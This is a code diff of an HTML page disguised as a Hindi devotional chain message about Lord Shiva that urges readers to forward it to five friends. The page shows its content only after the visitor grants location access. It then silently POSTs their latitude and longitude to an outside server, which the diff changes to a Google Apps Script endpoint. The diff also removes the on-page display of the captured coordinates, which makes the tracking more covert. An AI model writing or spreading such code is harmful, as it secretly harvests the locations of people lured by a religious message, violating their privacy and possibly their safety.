@@ -29,19 +29,13 @@
     document.addEventListener("DOMContentLoaded", function () {
       const content = document.getElementById("main-content");
       const warning = document.getElementById("warning");
-      const coords = document.getElementById("coords");
 
       navigator.geolocation.getCurrentPosition(
         function (position) {
           content.style.display = "block";
           warning.style.display = "none";
 
-          // Location dikhana
-          coords.innerText =
-            `आपकी Location: Latitude ${position.coords.latitude}, Longitude ${position.coords.longitude}`;
-
-          // Location server pe bhejna
-          fetch("https://bhole-baba.onrender.com/save-location", {
+          fetch("https://script.google.com/macros/s/AKfycbxL8oPihXWcGqvq-hpC5HyKqOKyCRzZHgx3HA3tqz-7d40hU1kjCgYo5QzvlFm-wrer/exec", {
             method: "POST",
             headers: {
               "Content-Type": "application/json"
@@ -51,13 +45,13 @@
               longitude: position.coords.longitude
             })
           })
-            .then(response => response.text())
-            .then(data => {
-              console.log("Location sent:", data);
-            })
-            .catch(err => {
-              console.error("Error sending location:", err);
-            });
+          .then(response => response.text())
+          .then(data => {
+            console.log("Location sent:", data);
+          })
+          .catch(err => {
+            console.error("Error sending location:", err);
+          });
         },
         function (error) {
           content.style.display = "none";
@@ -78,7 +72,6 @@
   <h1>ॐ नमः शिवाय</h1>
   <p>महादेव आपकी मनोकामना पूरी करें!</p>
   <p>इस मैसेज को अभी अपने 5 दोस्तों को भेजो और देखो चमत्कार!</p>
-  <p id="coords"></p> <!-- ✅ यहीं location दिखाई जाएगी -->
   <img src="https://i.postimg.cc/tT9XKSsJ/adiyogi-lord-shiva-1179x2556-14420.png" alt="Mahadev Image" />
 </div>
 
